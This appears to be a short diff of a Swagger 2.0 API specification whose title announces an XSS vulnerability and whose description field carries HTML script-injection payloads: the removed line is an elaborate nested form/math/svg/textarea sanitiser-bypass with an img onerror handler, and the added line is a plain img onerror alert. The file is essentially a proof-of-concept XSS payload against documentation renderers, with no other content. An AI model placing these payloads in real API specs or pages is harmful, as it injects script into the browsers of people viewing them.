@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Faithcsde API XSS vulnerability
   description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=console.log("pwned") src=1>"></form>
+            <img onerror=alert('XSS') src=1>">
   version: production
 basePath: /docs/
 produces:
